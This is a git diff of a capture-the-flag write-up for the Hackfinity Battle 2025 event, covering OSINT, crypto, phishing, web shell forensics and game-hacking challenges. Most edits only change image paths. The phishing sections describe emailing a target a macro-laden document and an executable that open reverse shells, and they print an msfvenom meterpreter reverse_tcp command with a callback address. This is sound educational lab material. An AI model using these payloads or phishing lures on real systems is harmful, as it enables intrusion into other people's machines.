@@ -63,23 +63,23 @@ For example: __THM{the_best_pizza}__.
 
 It is also provided the CCTV image.
 
-![CCTV-Image](/blog/static/hackfinity-battle-ctf-2025/CatchMeIfYouCan/beco_osint.png)
+![CCTV-Image](/hackfinity-battle-ctf-2025/CatchMeIfYouCan/beco_osint.png)
 
 ##### Solution
 
 Investigating the image, we can find a plate saying "Beco do Batman".
 
-![image](/blog/static/hackfinity-battle-ctf-2025/CatchMeIfYouCan/beco_do_batman.png)
+![image](/hackfinity-battle-ctf-2025/CatchMeIfYouCan/beco_do_batman.png)
 
 With google maps help, we can search Beco do Batman and get a location in Sao Paulo.
 
-![image](/blog/static/hackfinity-battle-ctf-2025/CatchMeIfYouCan/google_maps.png)
+![image](/hackfinity-battle-ctf-2025/CatchMeIfYouCan/google_maps.png)
 
 With a little search, we found that this is the exact location and the burger restaurant mentioned.
 
-![image](/blog/static/hackfinity-battle-ctf-2025/CatchMeIfYouCan/google_maps2.png)
+![image](/hackfinity-battle-ctf-2025/CatchMeIfYouCan/google_maps2.png)
 
-![image](/blog/static/hackfinity-battle-ctf-2025/CatchMeIfYouCan/google_maps3.png)
+![image](/hackfinity-battle-ctf-2025/CatchMeIfYouCan/google_maps3.png)
 
 The requested restaurant is Coringa do Beco!
 
@@ -101,7 +101,7 @@ For example: If the address is 24 Rua Pablo Antonio, the flag would be __THM{23_
 
 Following the other challenges, this safe house must be in the same region, Sao Paulo. We searched the internet for "Mr Wok sao paulo". The first result fitted well for what we were looking for. The address is __*Rua Galvão Bueno, 83, São Paulo, BR 01506-000*__.
 
-![image](/blog/static/hackfinity-battle-ctf-2025/CatchMeIfYouCan3/search_cmiyc3.png)
+![image](/hackfinity-battle-ctf-2025/CatchMeIfYouCan3/search_cmiyc3.png)
 
 ### Cryptography Challenges
 
@@ -118,38 +118,38 @@ Can you find the RSA private key?
 
 Starting the provided VM, it is prompted the following:
 
-![image](/blog/static/hackfinity-battle-ctf-2025/DarkMatter/ransomware.png)
+![image](/hackfinity-battle-ctf-2025/DarkMatter/ransomware.png)
 
 ##### Solution
 
 It is said that the tmp directory was used to save data from the debugging of the ransomware. This is what tmp contains:
 
-![image](/blog/static/hackfinity-battle-ctf-2025/DarkMatter/folders.png)
+![image](/hackfinity-battle-ctf-2025/DarkMatter/folders.png)
 
 At first glance, the files that look promising are __*encrypted_aes_key.bin*__ and __*public_key.txt*__. As said in the challenge statement, we need to find the RSA private key, so we can exclude the __*encrypted_aes_key.bin*__. Opening the __*public_key.txt*__
 we can confirm that this key is a RSA public key because of the *n* and *e*.
 
-![image](/blog/static/hackfinity-battle-ctf-2025/DarkMatter/key_info.png)
+![image](/hackfinity-battle-ctf-2025/DarkMatter/key_info.png)
 
 >This *n* is called the modulus and is calculated by *p * q* (Two large prime numbers that are kept secret) operation.
 > The public exponent, is typically a small prime number chosen to be relatively prime to (p−1)(q−1).
 >What we want is *d* the private exponent, calculated as:
->![image](/blog/static/hackfinity-battle-ctf-2025/DarkMatter/dformula.png)
+>![image](/hackfinity-battle-ctf-2025/DarkMatter/dformula.png)
 
 So if we obtain *p* and *q* we can obtain *d* (private key). If *n* is a small number, it is computationally feasible to factorize it and obtain p and q, which it is. We used a online number facotrizer to be more fast in the process, rather than doing a python script.
 We used this site ([Number Empire Number Factorizer](https://www.numberempire.com/numberfactorizer.php)).
 
 The p and q are the following numbers:
 
-![image](/blog/static/hackfinity-battle-ctf-2025/DarkMatter/NumberFactorizer.png)
+![image](/hackfinity-battle-ctf-2025/DarkMatter/NumberFactorizer.png)
 
 Calculating *d* with what we have, we obtain __196442361873243903843228745541797845217__. This number is the private key. When used in thee ransomware note the files are decrypted with success.
 
-![image](/blog/static/hackfinity-battle-ctf-2025/DarkMatter/ransomwaredecryption.png)
+![image](/hackfinity-battle-ctf-2025/DarkMatter/ransomwaredecryption.png)
 
 The key is in the __*student_grades.docx*__ document.
 
-![image](/blog/static/hackfinity-battle-ctf-2025/DarkMatter/flag.png)
+![image](/hackfinity-battle-ctf-2025/DarkMatter/flag.png)
 
 #### Order
 
@@ -172,11 +172,11 @@ The challenge explicitly indicates that the message used repeating-key XOR ciphe
 
 If every message starts with header __*ORDER:*__ we can find the first characters in the intercepted message (Because of the XOR). Using an online encrypter and decrypter ([md5decrypt.net/en/Xor/](https://md5decrypt.net/en/Xor/)), we managed to find the following:
 
-![image](/blog/static/hackfinity-battle-ctf-2025/Order/firstdec.png)
+![image](/hackfinity-battle-ctf-2025/Order/firstdec.png)
 
 This indicates that __*SNEAKY*__ was the key used to encrypt the message. So repeating the process but this time with SNEAKY as the key we can decrypt the message.
 
-![image](/blog/static/hackfinity-battle-ctf-2025/Order/seconddec.png)
+![image](/hackfinity-battle-ctf-2025/Order/seconddec.png)
 
 ### Red Teaming Challenges
 
@@ -195,11 +195,11 @@ __Password:__ YouCantCatchMe
 
 When opened the DarkSpecter's email we are faced with the following:
 
-![image](/blog/static/hackfinity-battle-ctf-2025/GhostPhishing/firstemail.png)
+![image](/hackfinity-battle-ctf-2025/GhostPhishing/firstemail.png)
 
 So the first thing we did was send an simple document (txt) with a attack report and asking for a password to see what cipher responds. The response was this:
 
-![image](/blog/static/hackfinity-battle-ctf-2025/GhostPhishing/secondemail.png)
+![image](/hackfinity-battle-ctf-2025/GhostPhishing/secondemail.png)
 
 After multiple tries, we search a bit about what could be done with docx and docm documents. We found that it is possible, using macros, do a reverse shell.
 Basically, when cipher opens the document, it will run a piece of code that will connect to our machine. For this we need to activate the macros in Word.
@@ -227,23 +227,23 @@ Now for the macro work we need to do the following thing:
 
 - Go to Developer on the menu above and select Macros.
 - We need to make sure that we are creating the macro in the document we want to send. (We were struggling a bit because we were saving in other location and, because of that, we weren't managing to get a reverse shell ;( )
-![image](/blog/static/hackfinity-battle-ctf-2025/GhostPhishing/macros.png)
+![image](/hackfinity-battle-ctf-2025/GhostPhishing/macros.png)
 - Click in create and copy and paste the code above and save.
-![image](/blog/static/hackfinity-battle-ctf-2025/GhostPhishing/macros2.png)
+![image](/hackfinity-battle-ctf-2025/GhostPhishing/macros2.png)
 - After this close the window and save the document.
 
 After this we have our macro ready to go. We send the email with the document attached and wait for cipher make this mistake of opening it. Before sending it we need to set up a listener in our machine.
 Using ncat for that:
 
-![image](/blog/static/hackfinity-battle-ctf-2025/GhostPhishing/ncat.png)
+![image](/hackfinity-battle-ctf-2025/GhostPhishing/ncat.png)
 
 Finally, we send the document in the attachments and wait for the connection.
 
-![image](/blog/static/hackfinity-battle-ctf-2025/GhostPhishing/thirdemail.png)
+![image](/hackfinity-battle-ctf-2025/GhostPhishing/thirdemail.png)
 
 Now the easy part, search for the flag. It is said that we need the Administrator flag. So we looked in Administrator user and found the flag in the Desktop directory.
 
-![image](/blog/static/hackfinity-battle-ctf-2025/GhostPhishing/remoteaccess.png)
+![image](/hackfinity-battle-ctf-2025/GhostPhishing/remoteaccess.png)
 
 #### Shadow Phishing
 
@@ -261,7 +261,7 @@ __Password:__ ShadowIsTheBest
 
 When accessing the ShadowByte email we see this email from Cipher:
 
-![image](/blog/static/hackfinity-battle-ctf-2025/ShadowPhishing/firstemail.png)
+![image](/hackfinity-battle-ctf-2025/ShadowPhishing/firstemail.png)
 
 Cipher told ShadowByte that he needs a exe! Like Ghost Phishing challenge, we could create a reverse TCP shell windows executable. For this we used metasploit for a faster and easy way to create this.
 
@@ -272,16 +272,16 @@ sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.23.56.134 LPORT=8080 -
 ```
 
 After we went to the msfconsole and created our payload and started listenning for incoming connections.
-![image](/blog/static/hackfinity-battle-ctf-2025/ShadowPhishing/metasploit.png)
-![image](/blog/static/hackfinity-battle-ctf-2025/ShadowPhishing/metasploit2.png)
+![image](/hackfinity-battle-ctf-2025/ShadowPhishing/metasploit.png)
+![image](/hackfinity-battle-ctf-2025/ShadowPhishing/metasploit2.png)
 
 After this we sent the executable to Cipher, replying to the email he sent. He didnt responded but we got the connection.
 
-![image](/blog/static/hackfinity-battle-ctf-2025/ShadowPhishing/access.png)
+![image](/hackfinity-battle-ctf-2025/ShadowPhishing/access.png)
 
 They want the Administrator flag. So we went to the Administrator desktop and found the flag!
 
-![Untitled design](/blog/static/hackfinity-battle-ctf-2025/ShadowPhishing/access2.png)
+![Untitled design](/hackfinity-battle-ctf-2025/ShadowPhishing/access2.png)
 
 ### Web Exploitation Challenges
 
@@ -295,7 +295,7 @@ Cipher’s legion of bots has exploited a known vulnerability in our web applica
 
 It is said that the cipher's legion of bots left a dangerous web shell implant. Exploring the /var/www/html folder we found a shoulder containing the web application mentioned in the statement.
 
-![image](/blog/static/hackfinity-battle-ctf-2025/InfinityShell/folder.png)
+![image](/hackfinity-battle-ctf-2025/InfinityShell/folder.png)
 
 This site, probably contained some kind of field to insert files without checking them. Probably, cipher abused this... We checked the img folder and found a suspicious file called images.php with following code:
 
@@ -307,11 +307,11 @@ This file is weird. First is using system() function and is in the middle of the
 
 After a bit of investigation, we found nothing. If the attacker uploaded a malicious file, he probably used it as a web shell. So we checked the logs. After a bit of searching we found the following:
 
-![image](/blog/static/hackfinity-battle-ctf-2025/InfinityShell/folder2.png)
+![image](/hackfinity-battle-ctf-2025/InfinityShell/folder2.png)
 
 We opened the last file in hope for access logs by this actors. And we found something!
 
-![Untitled design(1)](/blog/static/hackfinity-battle-ctf-2025/InfinityShell/log.png)
+![Untitled design(1)](/hackfinity-battle-ctf-2025/InfinityShell/log.png)
 
 The line 81 looked promising. A string encoded in base64.
 
@@ -407,7 +407,7 @@ Using CyberChef[https://cyberchef.org/] to convert the hash from hexa to text yo
 
 Cipher has gone dark, but intel reveals he’s hiding critical secrets inside Tetris, a popular video game. Hack it and uncover the encrypted data buried in its code.
 
->It is provided a zip with a executable inside it [Download_Tetrix.zip](/blog/static/hackfinity-battle-ctf-2025/TheGame/Tetrix.exe-1741979048280.zip)
+>It is provided a zip with a executable inside it [Download_Tetrix.zip](/hackfinity-battle-ctf-2025/TheGame/Tetrix.exe-1741979048280.zip)
 
 ##### Solution
 
@@ -421,26 +421,26 @@ This challenge was very easy. We extracted the zip and isolated the executable. 
 
 Cipher’s trail led us to a new version of Tetris hiding encrypted information. As we cracked its code, a chilling message emerged: "The game is never over."
 
->It is provided a zip with a executable inside it [Download_Tetrix_v2.zip](/blog/static/hackfinity-battle-ctf-2025/TheGame2/TetrixFinalv2.exe-1742225230694.zip)
+>It is provided a zip with a executable inside it [Download_Tetrix_v2.zip](/hackfinity-battle-ctf-2025/TheGame2/TetrixFinalv2.exe-1742225230694.zip)
 
 ##### Solution
 
 This challenge was harder than the v1 version of this. This time using *strings* was not possible to obtain the flag or any useful info.
 To gather more information we executed the game in a secure environment. We compared it to the version 1 and it was different. The most different thing was that the v2 has a string saying the following:
 
-![image](/blog/static/hackfinity-battle-ctf-2025/TheGame2/game.png)
+![image](/hackfinity-battle-ctf-2025/TheGame2/game.png)
 
 This must be a hint to obtain the flag. It was time for some game hacking. We used cheat engine to be able to modified values in the process running the game. The first thing that we thought was to modified the score to a number higher to 999999.
 Unsuccessfully.
 
-![image](/blog/static/hackfinity-battle-ctf-2025/TheGame2/game2.png)
+![image](/hackfinity-battle-ctf-2025/TheGame2/game2.png)
 
 Five results, when searching for the score value. We tried to change every value of the five addresses. Nothing...
 
 If changing the score does nothing, what about changing the minimum score.
 
-![image](/blog/static/hackfinity-battle-ctf-2025/TheGame2/game3.png)
+![image](/hackfinity-battle-ctf-2025/TheGame2/game3.png)
 
 This looked promising, so we changed the value in the first address to 100. So if we scored 100 points maybe the program would show something. And it did.
 
-![image](/blog/static/hackfinity-battle-ctf-2025/TheGame2/game4.png)
+![image](/hackfinity-battle-ctf-2025/TheGame2/game4.png)
